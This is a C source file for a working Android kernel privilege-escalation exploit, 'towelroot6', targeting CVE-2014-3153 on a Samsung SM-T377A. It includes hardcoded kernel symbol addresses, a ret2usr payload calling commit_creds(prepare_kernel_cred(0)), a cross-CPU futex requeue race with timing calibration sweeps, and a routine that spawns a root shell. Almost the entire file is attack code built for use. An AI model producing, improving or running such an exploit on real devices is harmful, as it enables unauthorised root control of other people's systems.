/*
 * towelroot6.c — CVE-2014-3153 corrected-timing race exploit
 *
 * Target: Samsung SM-T377A, Android 6.0.1, kernel 3.10.9 ARMv7
 *         No KASLR, No PXN, No stack canaries
 *
 * FIXES over towelroot5:
 *
 *   BUG 1 — Wrong race timing (root cause of 0 anomalies in 80K iters):
 *     towelroot5 fired CMP_REQUEUE_PI at t=0 (same moment victim started
 *     entering WAIT_REQUEUE_PI). The victim's hrtimer fired at t=T (100-500µs
 *     later) when main was already done. No concurrent kernel execution.
 *     FIX: victim signals "about to enter futex" via g_in_futex atomic.
 *     Main sleeps (T - delta) µs, THEN fires. CMP_REQUEUE_PI now executes
 *     right as victim's hrtimer fires → true concurrent race.
 *
 *   BUG 2 — UNLOCK_PI from non-owner:
 *     unlocker_thread called FUTEX_UNLOCK_PI on F2 every round → EPERM,
 *     because main (not unlocker) locked F2 via LOCK_PI.
 *     FIX: eliminated unlocker thread. Main unlocks F2 (main is the owner).
 *
 * CORRECT race model (geohot's original technique):
 *   1. Main: LOCK_PI(F2) — becomes PI owner
 *   2. Main: sets g_go=1
 *   3. Victim (CPU 0): sets g_in_futex=1, calls WAIT_REQUEUE_PI(F1, T=3ms)
 *   4. Main (CPU 1): sees g_in_futex=1, sleeps (T - delta) µs
 *   5. Main: CMP_REQUEUE_PI(F1→F2) — fires when victim's hrtimer is about to fire
 *   6. Main: UNLOCK_PI(F2) — wakes victim as PI owner, races with hrtimer cleanup
 *   7. Race: victim's hrtimer fires at t=T on CPU 0 while step 5-6 execute on CPU 1
 *      → inconsistent pi_state in __rt_mutex_slowlock → exploit condition
 *
 * CALIBRATION: each mode reports "requeue hits" (CMP_REQUEUE_PI return >0).
 *   requeue_hits ≈ 0%  → firing too late (victim already timed out), increase delta
 *   requeue_hits ≈ 100% → firing too early (always before timeout), decrease delta
 *   requeue_hits ≈ 50% → firing RIGHT at the timeout boundary → race window!
 *
 * ret2usr: commit_creds(prepare_kernel_cred(0)) in kernel context.
 * Kernel addresses confirmed from TIMA dmesg (no KASLR).
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <limits.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <fcntl.h>
#include <time.h>
#include <sched.h>
#include <linux/futex.h>
#include <stdatomic.h>

/* ========== Device-specific constants ========== */
#define COMMIT_CREDS        0xC0054328UL
#define PREPARE_KERNEL_CRED 0xC00548E0UL

/* ========== Futex layout — cache-line aligned ========== */
static volatile int *fmem;
#define F1  ((volatile int *)&fmem[0])
#define F2  ((volatile int *)&fmem[16])  /* 64 bytes apart = separate cache lines */

/* ========== Synchronization ========== */
/*
 * Round protocol:
 *   g_go:       0=idle, 1=main armed (enter futex), -1=exit
 *   g_in_futex: 1=victim is about to enter/entered WAIT_REQUEUE_PI
 *   g_vdone:    1=victim has completed this round
 *   g_anomalies: count of unexpected return values from victim
 *   g_requeues:  count of rounds where CMP_REQUEUE_PI returned >0 (race window hit)
 *   g_root:     1=we got root
 */
static atomic_int g_go        = ATOMIC_VAR_INIT(0);
static atomic_int g_in_futex  = ATOMIC_VAR_INIT(0);
static atomic_int g_vdone     = ATOMIC_VAR_INIT(0);
static atomic_int g_anomalies = ATOMIC_VAR_INIT(0);
static atomic_int g_requeues  = ATOMIC_VAR_INIT(0);
static atomic_int g_root      = ATOMIC_VAR_INIT(0);

/* Timeout for current mode — set by main before creating victim thread */
static int g_timeout_us = 3000;

/* ========== Helpers ========== */
static void pin_to_cpu(int cpu) {
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

static inline long long ns_now(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long long)ts.tv_sec * 1000000000LL + ts.tv_nsec;
}

static void sleep_us(int us) {
    if (us <= 0) return;
    struct timespec ts = { 0, (long)us * 1000L };
    nanosleep(&ts, NULL);
}

static struct timespec abs_mono_us(int us) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_nsec += (long)us * 1000L;
    while (ts.tv_nsec >= 1000000000L) { ts.tv_sec++; ts.tv_nsec -= 1000000000L; }
    return ts;
}

/* ========== ret2usr payload ========== */
/*
 * Runs in kernel context (no PXN on kernel 3.10.9 ARMv7).
 * commit_creds(prepare_kernel_cred(0)) elevates current task to uid=0.
 */
static void __attribute__((noinline, optimize("O0"), used))
kernel_payload(void) {
    void *(*pkc)(unsigned long)   = (void *(*)(unsigned long))PREPARE_KERNEL_CRED;
    int   (*cc)(void *)           = (int (*)(void *))COMMIT_CREDS;
    void *cred = NULL;

    __asm__ volatile(
        "mov  r0, #0\n\t"
        "blx  %1\n\t"
        "mov  %0, r0\n\t"
        : "=r"(cred) : "r"(pkc) : "r0", "r1", "r2", "r3", "lr"
    );
    if (cred) {
        __asm__ volatile(
            "mov  r0, %0\n\t"
            "blx  %1\n\t"
            : : "r"(cred), "r"(cc) : "r0", "r1", "r2", "r3", "lr"
        );
    }
}

static int check_root(void) {
    if (getuid() == 0 || geteuid() == 0) {
        atomic_store(&g_root, 1);
        return 1;
    }
    return 0;
}

static void spawn_shell(void) {
    printf("[!!!] UID=0 — spawning root shell!\n");
    fflush(stdout);
    execl("/system/bin/sh", "sh", NULL);
    execl("/bin/sh", "sh", NULL);
    _exit(0);
}

/* ========== Victim thread ========== */
/*
 * Loops waiting for main's signal, enters WAIT_REQUEUE_PI, handles result.
 * Pinned to CPU 0; main/requeuer is on CPU 1 for true concurrent race.
 */
static void *victim_thread(void *arg) {
    (void)arg;
    pin_to_cpu(0);

    while (1) {
        int go = atomic_load(&g_go);
        if (go == -1) break;
        if (go == 0) { sched_yield(); continue; }

        /*
         * Signal: "about to enter WAIT_REQUEUE_PI"
         * Main uses this as the timing reference for its sleep.
         * There is a brief window (~5-20µs) between this store and the actual
         * syscall entry, accounted for by main's 10µs guard sleep.
         */
        atomic_store(&g_in_futex, 1);

        struct timespec ts = abs_mono_us(g_timeout_us);
        int ret = syscall(SYS_futex, F1, FUTEX_WAIT_REQUEUE_PI, 0,
                          &ts, F2, 0);
        int err = errno;

        atomic_store(&g_in_futex, 0);

        if (ret == 0) {
            /* We were requeued and became PI owner of F2 */
            if (check_root()) {
                atomic_store(&g_vdone, 1);
                return (void *)1;
            }
            /* Release F2 ownership before next round */
            syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        } else if (err != ETIMEDOUT && err != EAGAIN && err != EINTR) {
            /* Unexpected return — possible race artifact */
            atomic_fetch_add(&g_anomalies, 1);
        }

        atomic_store(&g_vdone, 1);

        /* Wait for main to reset (g_go → 0) before next round */
        while (atomic_load(&g_go) != 0) sched_yield();
    }
    return NULL;
}

/* ========== Single race round ========== */
/*
 * delta_us > 0: fire CMP_REQUEUE_PI delta_us BEFORE timeout (race window before expiry)
 * delta_us = 0: fire right at timeout time
 * delta_us < 0: fire |delta_us| AFTER timeout (race window during cleanup)
 *
 * Returns: 1=root, 0=normal (ETIMEDOUT), -1=anomaly
 * *requeued: 1 if CMP_REQUEUE_PI found a waiter (proof victim was in futex)
 */
static int race_once(int delta_us, int *requeued) {
    /* Reset futexes */
    *F1 = 0;
    *F2 = 0;

    /* Main takes PI ownership of F2 — required for CMP_REQUEUE_PI target */
    int r = syscall(SYS_futex, F2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    if (r != 0 && errno != EDEADLK) {
        /* F2 lock failed unexpectedly — reset and skip */
        syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        syscall(SYS_futex, F1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
        if (requeued) *requeued = 0;
        return 0;
    }

    /* Arm: tell victim to enter WAIT_REQUEUE_PI */
    atomic_store(&g_vdone, 0);
    atomic_store(&g_go, 1);

    /* Wait for victim to signal "in_futex" (it's about to call the syscall) */
    while (!atomic_load(&g_in_futex)) sched_yield();

    /*
     * Guard sleep: victim stores g_in_futex=1 just BEFORE calling the syscall.
     * Give it ~15µs to actually enter kernel-mode. On Cortex-A7 at ~1.2GHz,
     * a syscall entry takes ~500ns. 15µs is a very safe margin.
     */
    sleep_us(15);

    /*
     * Now sleep for (timeout - delta - 15) µs.
     * At the end of this sleep, victim's hrtimer is delta_us from firing.
     * We then call CMP_REQUEUE_PI, which should execute during the timer window.
     */
    int fire_delay = g_timeout_us - delta_us - 15;
    if (fire_delay > 0) sleep_us(fire_delay);

    /*
     * FIRE: CMP_REQUEUE_PI(F1 → F2, max 1 waiter)
     * This should execute while victim's hrtimer is about to fire or just fired.
     * If victim was already timed out: returns 0 (no waiters found) → miss
     * If victim is still waiting:     returns 1 (requeued)          → race window
     */
    int rq = (int)syscall(SYS_futex, F1, FUTEX_CMP_REQUEUE_PI, 0,
                           (void *)(intptr_t)1, (void *)F2, 0);
    if (requeued) *requeued = (rq > 0) ? 1 : 0;
    if (rq > 0) atomic_fetch_add(&g_requeues, 1);

    /*
     * UNLOCK: release F2 (main is the PI owner, this is valid).
     * If victim was requeued to F2's waiters, this wakes it as PI owner.
     * Concurrent with victim's hrtimer cleanup → the race condition.
     */
    syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);

    /* Ensure victim is unblocked even if we missed the requeue */
    syscall(SYS_futex, F1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
    syscall(SYS_futex, F2, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);

    /* Tell victim the round is done — reset g_go to 0 for next round */
    atomic_store(&g_go, 0);

    /* Wait for victim to complete this round */
    while (!atomic_load(&g_vdone) && atomic_load(&g_root) == 0)
        sched_yield();

    if (atomic_load(&g_root)) return 1;
    return 0;
}

/* ========== Delta-sweep calibration mode ========== */
/*
 * Sweeps multiple delta values for a given timeout.
 * The requeue hit rate tells us where the race window is:
 *   hit=0%:   delta too large (victim times out before we fire) — reduce delta
 *   hit=50%:  firing right at the timeout boundary — PRIME RACE WINDOW
 *   hit=100%: delta too small (always requeue before timeout fires) — increase delta
 * Then runs bulk iters at the best delta.
 */
static int calibration_sweep(int timeout_us, int iters_per_delta,
                              int bulk_iters) {
    static const int deltas[] = { 500, 300, 200, 100, 50, 0, -50, -100, -200 };
    static const int ndelta   = 9;

    g_timeout_us = timeout_us;

    printf("\n[*] === Calibration sweep T=%dµs ===\n", timeout_us);
    fflush(stdout);

    /* Create victim thread (it will loop until g_go=-1) */
    pthread_t vtid;
    atomic_store(&g_go, 0);
    atomic_store(&g_vdone, 0);
    atomic_store(&g_in_futex, 0);
    pthread_create(&vtid, NULL, victim_thread, NULL);

    /* Main stays on CPU 1 */
    pin_to_cpu(1);

    int best_delta = 0;
    int best_rate  = -1;

    for (int d = 0; d < ndelta; d++) {
        int delta = deltas[d];
        int hits  = 0;
        int anomalies_start = atomic_load(&g_anomalies);

        for (int i = 0; i < iters_per_delta; i++) {
            int rq = 0;
            int r  = race_once(delta, &rq);
            if (rq) hits++;
            if (r == 1) goto root_achieved;
            if (atomic_load(&g_root)) goto root_achieved;
        }

        int hit_rate  = hits * 100 / iters_per_delta;
        int anomalies = atomic_load(&g_anomalies) - anomalies_start;
        printf("[*] T=%dµs delta=%+4dµs  hits=%3d/%d (%3d%%)  anomalies=%d\n",
               timeout_us, delta, hits, iters_per_delta, hit_rate, anomalies);
        fflush(stdout);

        /* Pick delta closest to 50% hit rate as best window */
        int dist = abs(hit_rate - 50);
        if (best_rate < 0 || dist < abs(best_rate - 50)) {
            best_rate  = hit_rate;
            best_delta = delta;
        }
    }

    printf("[*] Best delta: %+dµs (hit_rate=%d%%)\n", best_delta, best_rate);
    printf("[*] Running bulk: %d iters at T=%dµs delta=%+dµs\n",
           bulk_iters, timeout_us, best_delta);
    fflush(stdout);

    {
        long long t0    = ns_now();
        int anomalies0  = atomic_load(&g_anomalies);
        int requeues0   = atomic_load(&g_requeues);

        for (int i = 0; i < bulk_iters; i++) {
            int r = race_once(best_delta, NULL);
            if (r == 1 || atomic_load(&g_root)) goto root_achieved;

            if ((i + 1) % 2000 == 0) {
                long long elapsed = (ns_now() - t0) / 1000000LL;
                int new_requeues  = atomic_load(&g_requeues)  - requeues0;
                int new_anomalies = atomic_load(&g_anomalies) - anomalies0;
                printf("[*]  %5d/%d | requeues=%d anomalies=%d | uid=%d | %lldms\n",
                       i + 1, bulk_iters, new_requeues, new_anomalies,
                       getuid(), elapsed);
                fflush(stdout);
            }
        }

        int final_anomalies = atomic_load(&g_anomalies) - anomalies0;
        int final_requeues  = atomic_load(&g_requeues)  - requeues0;
        printf("[*] Bulk done: requeues=%d anomalies=%d uid=%d\n",
               final_requeues, final_anomalies, getuid());
    }

    atomic_store(&g_go, -1);
    pthread_join(vtid, NULL);
    return 0;

root_achieved:
    atomic_store(&g_go, -1);
    pthread_join(vtid, NULL);
    return 1;
}

/* ========== Multi-victim mode ========== */
/*
 * 2 victims on CPU 0, each with slightly offset timeouts.
 * Increases race surface: more concurrent kernel activity on CPU 0.
 */
#define MV_VICTIMS 2

static atomic_int g_mv_go   = ATOMIC_VAR_INIT(0);
static atomic_int g_mv_done = ATOMIC_VAR_INIT(0);
static int        g_mv_timeout_us[MV_VICTIMS] = { 3000, 3100 };

static void *mv_victim(void *arg) {
    int idx = (int)(intptr_t)arg;
    pin_to_cpu(0);

    while (!atomic_load(&g_mv_done)) {
        while (!atomic_load(&g_mv_go) && !atomic_load(&g_mv_done))
            sched_yield();
        if (atomic_load(&g_mv_done)) break;

        struct timespec ts = abs_mono_us(g_mv_timeout_us[idx]);
        int ret = syscall(SYS_futex, F1, FUTEX_WAIT_REQUEUE_PI, 0,
                          &ts, F2, 0);
        if (ret == 0) {
            if (check_root()) {
                atomic_store(&g_mv_done, 1);
                return (void *)1;
            }
            syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        }
        atomic_fetch_add(&g_vdone, 1);
    }
    return NULL;
}

static int multi_victim_loop(int iters, int delta_us) {
    printf("\n[*] === Multi-victim mode: %d iters, delta=%+dµs ===\n",
           iters, delta_us);
    fflush(stdout);

    atomic_store(&g_mv_done, 0);
    atomic_store(&g_mv_go, 0);
    atomic_store(&g_vdone, 0);
    atomic_store(&g_anomalies, 0);
    atomic_store(&g_requeues, 0);

    pthread_t vt[MV_VICTIMS];
    for (int i = 0; i < MV_VICTIMS; i++)
        pthread_create(&vt[i], NULL, mv_victim, (void *)(intptr_t)i);

    pin_to_cpu(1);
    long long t0 = ns_now();

    for (int i = 0; i < iters && !atomic_load(&g_mv_done); i++) {
        *F1 = 0;
        *F2 = 0;

        syscall(SYS_futex, F2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);

        atomic_store(&g_vdone, 0);
        atomic_store(&g_mv_go, 1);

        /* Delay to race with the shorter timeout victim (3000µs) */
        sleep_us(g_mv_timeout_us[0] - delta_us);

        /* Requeue up to 2 waiters */
        int rq = (int)syscall(SYS_futex, F1, FUTEX_CMP_REQUEUE_PI, 0,
                               (void *)(intptr_t)2, (void *)F2, 0);
        if (rq > 0) atomic_fetch_add(&g_requeues, rq);

        syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        syscall(SYS_futex, F1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
        syscall(SYS_futex, F2, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);

        atomic_store(&g_mv_go, 0);

        while (atomic_load(&g_vdone) < MV_VICTIMS && !atomic_load(&g_mv_done))
            sched_yield();

        if (atomic_load(&g_root) || check_root()) {
            printf("\n[!!!] ROOT via multi-victim at iter %d!\n", i);
            goto done;
        }

        if ((i + 1) % 1000 == 0) {
            long long elapsed = (ns_now() - t0) / 1000000LL;
            printf("[*] MV %5d/%d | requeues=%d anomalies=%d | uid=%d | %lldms\n",
                   i + 1, iters, atomic_load(&g_requeues), atomic_load(&g_anomalies),
                   getuid(), elapsed);
            fflush(stdout);
        }
    }

done:
    atomic_store(&g_mv_done, 1);
    for (int i = 0; i < MV_VICTIMS; i++) {
        syscall(SYS_futex, F1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
        syscall(SYS_futex, F2, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
        pthread_join(vt[i], NULL);
    }

    printf("[*] Multi-victim done: requeues=%d anomalies=%d uid=%d\n",
           atomic_load(&g_requeues), atomic_load(&g_anomalies), getuid());
    return atomic_load(&g_root);
}

/* ========== Main ========== */
int main(void) {
    printf("=== towelroot6 — CVE-2014-3153 corrected timing — SM-T377A ===\n");
    printf("[*] pid=%d uid=%d euid=%d\n", getpid(), getuid(), geteuid());
    printf("[*] commit_creds=0x%08lX  prepare_kernel_cred=0x%08lX\n",
           COMMIT_CREDS, PREPARE_KERNEL_CRED);
    fflush(stdout);

    /* Verify FUTEX_LOCK_PI is available */
    int ft = 0;
    int r = syscall(SYS_futex, &ft, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    if (r != 0 && errno == ENOSYS) {
        fprintf(stderr, "[-] FUTEX_LOCK_PI not supported\n");
        return 1;
    }
    syscall(SYS_futex, &ft, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    printf("[+] FUTEX_LOCK_PI available\n");

    /* Count CPUs */
    int ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
    printf("[*] CPUs online: %d\n", ncpu);
    if (ncpu < 2) {
        fprintf(stderr, "[-] Need >= 2 CPUs for cross-CPU race\n");
        return 1;
    }

    /* Allocate futex memory (anonymous shared, cache-line aligned) */
    fmem = (volatile int *)mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                                 MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (fmem == MAP_FAILED) { perror("mmap"); return 1; }

    /*
     * Phase 1: Calibration sweep at T=3ms
     * Sweeps deltas from +500µs to -200µs, 500 iters each.
     * Identifies the delta that puts us at ~50% requeue hit rate.
     * Then runs 30,000 bulk iters at that delta.
     */
    if (calibration_sweep(3000, 500, 30000)) goto root;

    /*
     * Phase 2: Calibration sweep at T=5ms
     * Longer timeout = more jitter tolerance, may give wider race window.
     */
    if (calibration_sweep(5000, 500, 30000)) goto root;

    /*
     * Phase 3: Calibration sweep at T=1ms
     * Shorter timeout = more iterations per minute, tighter window.
     */
    if (calibration_sweep(1000, 500, 20000)) goto root;

    /*
     * Phase 4: Multi-victim mode at best timing
     * 2 simultaneous WAIT_REQUEUE_PI victims creates more PI waiter
     * activity on CPU 0, potentially widening the race surface.
     * Use delta=100µs (conservative, fire before timeout) — the multi-victim
     * variant's race is less timing-sensitive than single victim.
     */
    if (multi_victim_loop(20000, 100)) goto root;

    printf("\n[*] All modes complete. uid=%d\n", getuid());
    fflush(stdout);
    return 0;

root:
    if (getuid() == 0 || geteuid() == 0) {
        spawn_shell();
    }
    return 0;
}
